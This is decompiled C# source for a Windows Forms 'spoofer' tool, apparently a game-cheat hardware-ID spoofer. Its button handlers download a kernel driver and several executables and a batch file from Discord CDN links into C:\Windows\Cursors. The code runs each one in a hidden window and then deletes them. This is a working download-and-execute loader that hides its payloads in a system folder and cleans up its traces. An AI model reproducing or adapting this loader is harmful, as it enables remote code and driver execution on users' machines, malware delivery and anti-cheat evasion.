using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using ChetSpoofer.Properties;
using Siticone.Desktop.UI.WinForms;

namespace ChetSpoofer
{
	// Token: 0x02000008 RID: 8
	public partial class Spoofers : Form
	{
		// Token: 0x06000036 RID: 54 RVA: 0x00005811 File Offset: 0x00003A11
		public Spoofers()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000037 RID: 55 RVA: 0x00005829 File Offset: 0x00003A29
		private void pictureBox1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000038 RID: 56 RVA: 0x0000582C File Offset: 0x00003A2C
		private void pictureBox5_Click(object sender, EventArgs e)
		{
			new Main().Show();
			base.Hide();
		}

		// Token: 0x06000039 RID: 57 RVA: 0x00005844 File Offset: 0x00003A44
		private void pictureBox2_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\Cursors\\SUS.sys";
			string text2 = "C:\\Windows\\Cursors\\SAS.exe";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/1028004149528363018/1029441158834819203/SUS.sys", text);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/1028004149528363018/1029441159229087885/SAS.exe", text2);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process = Process.Start(text2, text);
			Thread.Sleep(750);
			File.Delete(text);
			File.Delete(text2);
		}

		// Token: 0x0600003A RID: 58 RVA: 0x000058E0 File Offset: 0x00003AE0
		private void pictureBox1_Click_1(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\Cursors\\cursor.exe";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/1031899813194780777/1031962809870848031/cursor.exe", text);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process = Process.Start(text);
			Thread.Sleep(750);
			File.Delete(text);
		}

		// Token: 0x0600003B RID: 59 RVA: 0x00005960 File Offset: 0x00003B60
		private void pictureBox3_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\Cursors\\checker.bat";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/1031899813194780777/1032926547444776970/checker.bat", text);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process = Process.Start(text);
			Thread.Sleep(500);
			process.WaitForExit();
			File.Delete(text);
		}
	}
}
